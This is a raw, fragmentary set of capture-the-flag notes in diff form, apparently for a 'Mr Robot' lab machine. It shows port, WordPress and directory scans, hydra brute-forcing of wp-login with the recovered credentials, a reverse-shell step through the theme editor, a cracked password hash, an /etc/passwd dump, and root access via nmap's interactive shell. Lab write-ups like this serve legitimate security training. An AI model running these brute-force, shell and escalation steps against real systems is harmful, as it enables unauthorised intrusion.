@@ -1,0 +1,397 @@
+─(kali㉿kali)-[~]
+└─$ nmap 10.10.126.88 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-11 12:24 EDT
+Nmap scan report for 10.10.126.88
+Host is up (0.12s latency).
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE
+22/tcp  closed ssh			smbclient nothing
+80/tcp  open   http     					first flag
+443/tcp open   https
+
+Nmap done: 1 IP address (1 host up) scanned in 9.11 seconds
+
+
+
+
+
+
+
+
+
+                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ wpscan 10.10.126.88
+One of the following options is required: --url, --update, --help, --hh, --version
+
+Please use --help/-h for the list of available options.
+                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ wpscan --url 10.10.126.88                                                 1 ⨯
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17
+                               
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://10.10.126.88/ [10.10.126.88]
+[+] Started: Sun Apr 11 12:29:53 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache
+ |  - X-Mod-Pagespeed: 1.9.32.3-4523
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://10.10.126.88/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.126.88/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] The external WP-Cron seems to be enabled: http://10.10.126.88/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.126.88/07b9584.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.126.88/07b9584.html, Match: 'WordPress 4.3.1'
+
+[+] WordPress theme in use: twentyfifteen
+ | Location: http://10.10.126.88/wp-content/themes/twentyfifteen/
+ | Last Updated: 2021-03-09T00:00:00.000Z
+ | Readme: http://10.10.126.88/wp-content/themes/twentyfifteen/readme.txt
+ | [!] The version is out of date, the latest version is 2.9
+ | Style URL: http://10.10.126.88/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
+ | Style Name: Twenty Fifteen
+ | Style URI: https://wordpress.org/themes/twentyfifteen/
+ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 1.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.126.88/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 <=====> (22 / 22) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sun Apr 11 12:30:19 2021
+[+] Requests Done: 71
+[+] Cached Requests: 6
+[+] Data Sent: 15.953 KB
+[+] Data Received: 16.432 MB
+[+] Memory used: 221.242 MB
+[+] Elapsed time: 00:00:26
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+└─$ python3 dirsearch.py -u http://10.10.126.88 
+/home/kali/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.2) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+
+  _|. _ _  _  _  _ _|_    v0.4.1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848
+
+Error Log: /home/kali/dirsearch/logs/errors-21-04-11_13-00-39.log
+
+Target: http://10.10.126.88/
+
+Output File: /home/kali/dirsearch/reports/10.10.126.88/_21-04-11_13-00-39.txt
+
+[13:00:40] Starting: 
+[13:00:41] 301 -    0B  - /%2e%2e//google.com  ->  http://10.10.126.88/../google.com
+[13:00:41] 301 -  231B  - /js  ->  http://10.10.126.88/js/
+[13:00:55] 403 -  223B  - /.htaccess.bak1
+[13:00:55] 403 -  223B  - /.htaccess.orig
+[13:00:55] 403 -  225B  - /.htaccess.sample
+[13:00:55] 403 -  223B  - /.htaccess.save
+[13:00:55] 403 -  221B  - /.htaccessOLD
+[13:00:55] 403 -  222B  - /.htaccessOLD2
+[13:00:55] 403 -  224B  - /.htaccess_extra
+[13:00:56] 403 -  220B  - /.ht_wsr.txt
+[13:00:56] 403 -  213B  - /.htm
+[13:00:56] 403 -  219B  - /.htpasswds
+[13:00:56] 403 -  223B  - /.htpasswd_test
+[13:00:56] 403 -  220B  - /.httr-oauth
+[13:00:56] 403 -  221B  - /.htaccessBAK
+[13:00:56] 403 -  221B  - /.htaccess_sc
+[13:00:56] 403 -  214B  - /.html
+[13:00:56] 403 -  223B  - /.htaccess_orig
+[13:01:09] 403 -  218B  - /.user.ini
+[13:01:12] 301 -    0B  - /0  ->  http://10.10.126.88/0/
+[13:01:21] 301 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  http://10.10.126.88/Citrix/AccessPlatform/auth/clientscripts/cookies.js
+[13:01:27] 301 -    0B  - /PMA2/index.php  ->  http://10.10.126.88/PMA2/
+[13:01:27] 301 -    0B  - /PMA/index.php  ->  http://10.10.126.88/PMA/
+[13:01:46] 301 -  234B  - /admin  ->  http://10.10.126.88/admin/
+[13:01:47] 301 -    0B  - /adm/index.php  ->  http://10.10.126.88/adm/
+[13:01:49] 403 -  224B  - /admin/.htaccess
+[13:01:49] 200 -    1KB - /admin/?/login
+[13:01:49] 200 -    1KB - /admin/
+[13:01:49] 301 -    0B  - /admin/PMA/index.php  ->  http://10.10.126.88/admin/PMA/
+[13:01:51] 200 -    1KB - /admin/index
+[13:01:51] 200 -    1KB - /admin/index.html
+[13:01:51] 301 -    0B  - /admin/index.php  ->  http://10.10.126.88/admin/
+[13:01:52] 301 -    0B  - /admin/mysql/index.php  ->  http://10.10.126.88/admin/mysql/
+[13:01:52] 301 -    0B  - /admin/mysql2/index.php  ->  http://10.10.126.88/admin/mysql2/
+[13:01:52] 301 -    0B  - /admin/phpMyAdmin/index.php  ->  http://10.10.126.88/admin/phpMyAdmin/
+[13:01:52] 301 -    0B  - /admin/phpmyadmin/index.php  ->  http://10.10.126.88/admin/phpmyadmin/
+[13:01:52] 301 -    0B  - /admin/pma/index.php  ->  http://10.10.126.88/admin/pma/
+[13:01:52] 301 -    0B  - /admin/phpmyadmin2/index.php  ->  http://10.10.126.88/admin/phpmyadmin2/
+[13:01:53] 301 -    0B  - /admin2/index.php  ->  http://10.10.126.88/admin2/
+[13:01:56] 301 -    0B  - /admin_area/index.php  ->  http://10.10.126.88/admin_area/
+[13:02:09] 301 -    0B  - /adminarea/index.php  ->  http://10.10.126.88/adminarea/
+[13:02:10] 301 -    0B  - /admincp/index.php  ->  http://10.10.126.88/admincp/
+[13:02:15] 301 -    0B  - /administrator/index.php  ->  http://10.10.126.88/administrator/
+[13:02:21] 301 -    0B  - /apc/index.php  ->  http://10.10.126.88/apc/
+[13:02:25] 301 -  234B  - /audio  ->  http://10.10.126.88/audio/
+[13:02:25] 301 -    0B  - /atom  ->  http://10.10.126.88/feed/atom/
+[13:02:30] 301 -    0B  - /bb-admin/index.php  ->  http://10.10.126.88/bb-admin/
+[13:02:31] 301 -    0B  - /bitrix/admin/index.php  ->  http://10.10.126.88/bitrix/admin/
+[13:02:32] 301 -  233B  - /blog  ->  http://10.10.126.88/blog/
+[13:02:32] 403 -  214B  - /blog/
+[13:02:38] 301 -    0B  - /claroline/phpMyAdmin/index.php  ->  http://10.10.126.88/claroline/phpMyAdmin/
+[13:02:48] 301 -  232B  - /css  ->  http://10.10.126.88/css/
+[13:02:49] 302 -    0B  - /dashboard  ->  http://10.10.126.88/wp-admin/
+[13:02:51] 301 -    0B  - /db/index.php  ->  http://10.10.126.88/db/
+[13:02:52] 301 -    0B  - /dbadmin/index.php  ->  http://10.10.126.88/dbadmin/
+[13:02:59] 301 -    0B  - /engine/classes/swfupload//swfupload_f9.swf  ->  http://10.10.126.88/engine/classes/swfupload/swfupload_f9.swf
+[13:02:59] 301 -    0B  - /engine/classes/swfupload//swfupload.swf  ->  http://10.10.126.88/engine/classes/swfupload/swfupload.swf
+[13:03:01] 301 -    0B  - /etc/lib/pChart2/examples/imageMap/index.php  ->  http://10.10.126.88/etc/lib/pChart2/examples/imageMap/
+[13:03:03] 301 -    0B  - /extjs/resources//charts.swf  ->  http://10.10.126.88/extjs/resources/charts.swf
+[13:03:03] 200 -    0B  - /favicon.ico
+[13:03:04] 301 -    0B  - /feed  ->  http://10.10.126.88/feed/
+[13:03:11] 301 -    0B  - /html/js/misc/swfupload//swfupload.swf  ->  http://10.10.126.88/html/js/misc/swfupload/swfupload.swf
+[13:03:13] 301 -  235B  - /images  ->  http://10.10.126.88/images/
+[13:03:13] 403 -  216B  - /images/
+[13:03:13] 301 -    0B  - /image  ->  http://10.10.126.88/image/
+[13:03:15] 200 -    1KB - /index.html
+[13:03:15] 301 -    0B  - /index.php  ->  http://10.10.126.88/
+[13:03:16] 301 -    0B  - /index.php/login/  ->  http://10.10.126.88/login/
+[13:03:18] 301 -    0B  - /install/index.php?upgrade/  ->  http://10.10.126.88/install/?upgrade/
+[13:03:18] 200 -  504KB - /intro
+[13:03:20] 403 -  212B  - /js/
+[13:03:37] 200 -  309B  - /license
+[13:03:38] 200 -  309B  - /license.txt
+[13:04:17] 302 -    0B  - /login  ->  http://10.10.126.88/wp-login.php
+[13:04:23] 301 -    0B  - /login.wdm%20  ->  http://10.10.126.88/login.wdm
+[13:04:23] 302 -    0B  - /login/  ->  http://10.10.126.88/wp-login.php
+[13:05:12] 301 -    0B  - /modelsearch/index.php  ->  http://10.10.126.88/modelsearch/
+[13:05:14] 301 -    0B  - /myadmin/index.php  ->  http://10.10.126.88/myadmin/
+[13:05:14] 301 -    0B  - /myadmin2/index.php  ->  http://10.10.126.88/myadmin2/
+[13:05:15] 301 -    0B  - /mysql-admin/index.php  ->  http://10.10.126.88/mysql-admin/
+[13:05:15] 301 -    0B  - /mysql/index.php  ->  http://10.10.126.88/mysql/
+[13:05:15] 301 -    0B  - /mysqladmin/index.php  ->  http://10.10.126.88/mysqladmin/
+[13:05:22] 301 -    0B  - /panel-administracion/index.php  ->  http://10.10.126.88/panel-administracion/
+[13:05:57] 301 -    0B  - /phpMyAdmin/index.php  ->  http://10.10.126.88/phpMyAdmin/
+[13:05:57] 301 -    0B  - /phpMyAdmin.old/index.php  ->  http://10.10.126.88/phpMyAdmin.old/
+[13:05:58] 301 -    0B  - /phpMyAdmin/phpMyAdmin/index.php  ->  http://10.10.126.88/phpMyAdmin/phpMyAdmin/
+[13:06:00] 301 -    0B  - /phpMyAdminold/index.php  ->  http://10.10.126.88/phpMyAdminold/
+[13:06:01] 301 -    0B  - /phpMyadmin_bak/index.php  ->  http://10.10.126.88/phpMyadmin_bak/
+[13:06:06] 301 -    0B  - /phpadmin/index.php  ->  http://10.10.126.88/phpadmin/
+[13:06:11] 403 -   94B  - /phpmyadmin
+[13:06:12] 403 -   94B  - /phpmyadmin/
+[13:06:12] 403 -   94B  - /phpmyadmin/index.php
+[13:06:12] 403 -   94B  - /phpmyadmin/phpmyadmin/index.php
+[13:06:12] 403 -   94B  - /phpmyadmin/scripts/setup.php
+[13:06:14] 301 -    0B  - /phpma/index.php  ->  http://10.10.126.88/phpma/
+[13:06:19] 301 -    0B  - /phpmyadmin-old/index.php  ->  http://10.10.126.88/phpmyadmin-old/
+[13:06:20] 301 -    0B  - /phpmyadmin0/index.php  ->  http://10.10.126.88/phpmyadmin0/
+[13:06:20] 301 -    0B  - /phpmyadmin1/index.php  ->  http://10.10.126.88/phpmyadmin1/
+[13:06:21] 301 -    0B  - /phpmyadmin2/index.php  ->  http://10.10.126.88/phpmyadmin2/
+[13:06:45] 301 -    0B  - /pma/index.php  ->  http://10.10.126.88/pma/
+[13:06:46] 301 -    0B  - /pma-old/index.php  ->  http://10.10.126.88/pma-old/
+[13:06:51] 301 -    0B  - /pmamy/index.php  ->  http://10.10.126.88/pmamy/
+[13:06:51] 301 -    0B  - /pmamy2/index.php  ->  http://10.10.126.88/pmamy2/
+[13:06:51] 301 -    0B  - /pmd/index.php  ->  http://10.10.126.88/pmd/
+[13:07:51] 200 -   64B  - /readme
+[13:07:51] 200 -   64B  - /readme.html
+[13:08:31] 200 -   41B  - /robots.txt
+[13:08:40] 301 -    0B  - /roundcube/index.php  ->  http://10.10.126.88/roundcube/
+[13:08:42] 301 -    0B  - /rss  ->  http://10.10.126.88/feed/
+[13:10:21] 200 -    0B  - /sitemap
+[13:10:22] 200 -    0B  - /sitemap.xml
+[13:10:22] 200 -    0B  - /sitemap.xml.gz
+[13:10:26] 301 -    0B  - /siteadmin/index.php  ->  http://10.10.126.88/siteadmin/
+[13:10:56] 301 -    0B  - /sql/index.php  ->  http://10.10.126.88/sql/
+[13:11:42] 301 -    0B  - /sugarcrm/index.php?module=Accounts&action=ShowDuplicates  ->  http://10.10.126.88/sugarcrm/?module=Accounts&action=ShowDuplicates
+[13:11:43] 301 -    0B  - /sugarcrm/index.php?module=Contacts&action=ShowDuplicates%20  ->  http://10.10.126.88/sugarcrm/?module=Contacts&action=ShowDuplicates%20
+[13:12:26] 301 -    0B  - /templates/beez/index.php  ->  http://10.10.126.88/templates/beez/
+[13:12:27] 301 -    0B  - /templates/ja-helio-farsi/index.php  ->  http://10.10.126.88/templates/ja-helio-farsi/
+[13:12:28] 301 -    0B  - /templates/rhuk_milkyway/index.php  ->  http://10.10.126.88/templates/rhuk_milkyway/
+[13:13:10] 301 -    0B  - /tmp/index.php  ->  http://10.10.126.88/tmp/
+[13:13:17] 301 -    0B  - /tools/phpMyAdmin/index.php  ->  http://10.10.126.88/tools/phpMyAdmin/
+[13:13:29] 301 -    0B  - /typo3/phpmyadmin/index.php  ->  http://10.10.126.88/typo3/phpmyadmin/
+[13:14:44] 301 -  234B  - /video  ->  http://10.10.126.88/video/
+[13:15:14] 301 -    0B  - /web/phpMyAdmin/index.php  ->  http://10.10.126.88/web/phpMyAdmin/
+[13:15:19] 301 -    0B  - /webadmin/index.php  ->  http://10.10.126.88/webadmin/
+[13:15:32] 301 -  237B  - /wp-admin  ->  http://10.10.126.88/wp-admin/
+[13:15:38] 301 -  239B  - /wp-content  ->  http://10.10.126.88/wp-content/
+[13:15:40] 200 -    1B  - /wp-admin/admin-ajax.php
+[13:15:40] 302 -    0B  - /wp-admin/  ->  http://10.10.126.88/wp-login.php?redirect_to=http%3A%2F%2F10.10.126.88%2Fwp-admin%2F&reauth=1
+[13:15:42] 500 -    3KB - /wp-admin/setup-config.php
+[13:15:43] 200 -    0B  - /wp-config.php
+[13:15:43] 403 -  245B  - /wp-content/plugins/akismet/admin.php
+[13:15:43] 403 -  247B  - /wp-content/plugins/akismet/akismet.php
+[13:15:43] 301 -  279B  - /wp-content/plugins/all-in-one-wp-migration/storage  ->  http://10.10.126.88/wp-content/plugins/all-in-one-wp-migration/storage/
+[13:15:45] 200 -    0B  - /wp-content/
+[13:15:45] 403 -  228B  - /wp-content/upgrade/
+[13:15:45] 403 -  228B  - /wp-content/uploads/
+[13:15:49] 301 -  240B  - /wp-includes  ->  http://10.10.126.88/wp-includes/
+[13:15:49] 403 -  221B  - /wp-includes/
+[13:15:49] 301 -    0B  - /wp-content/plugins/adminer/inc/editor/index.php  ->  http://10.10.126.88/wp-content/plugins/adminer/inc/editor/
+[13:15:50] 500 -    0B  - /wp-content/plugins/hello.php
+[13:15:50] 200 -    0B  - /wp-content/plugins/google-sitemap-generator/sitemap-core.php
+[13:15:56] 200 -    0B  - /wp-cron.php
+[13:15:56] 500 -    0B  - /wp-includes/rss-functions.php
+[13:15:57] 200 -    3KB - /wp-login
+[13:15:58] 200 -    3KB - /wp-login.php
+[13:15:58] 200 -    3KB - /wp-login/
+[13:15:58] 302 -    0B  - /wp-signup.php  ->  http://10.10.126.88/wp-login.php?action=register
+[13:15:59] 301 -    0B  - /wp-register.php  ->  http://10.10.126.88/wp-login.php?action=register
+[13:16:06] 301 -    0B  - /www/phpMyAdmin/index.php  ->  http://10.10.126.88/www/phpMyAdmin/
+[13:16:11] 301 -    0B  - /xampp/phpmyadmin/index.php  ->  http://10.10.126.88/xampp/phpmyadmin/
+[13:16:15] 405 -   42B  - /xmlrpc.php
+[13:16:15] 405 -   42B  - /xmlrpc
+
+Task Completed
+
+
+
+
+
+hydra
+
+
+sudo hydra -L /home/kali/Downloads/fsocity.dic -p test 10.10.126.88 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30   
+
+
+[80][http-post-form] host: 10.10.126.88   login: Elliot   password: test
+
+
+sudo hydra -l Elliot -P /home/kali/Downloads/fsocity.dic 10.10.126.88 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30 
+
+
+Elliot:ER28-0652
+
+
+log in // got to appearance code editor // insert php reverse 
+
+http://<ip>/wp-content/themes/twentyfifteen/archive.php
+
+
+
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+daemon@linux:/home/robot$ ls
+key-2-of-3.txt	password.raw-md5
+daemon@linux:/home/robot$ cat password.raw-md5 
+
+robot:c3fcd3d76192e4007dfb496cca67e13b
+
+robot:abcdefghijklmnopqrstuvwxyz
+
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
+bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
+mysql:x:1001:1001::/home/mysql:
+varnish:x:999:999::/home/varnish:
+robot:x:1002:1002::/home/robot:
+
+
+
+
+nmap --interactive
+!sh
+
+to get root
+
+
+
+
+
+
+
+
+
+
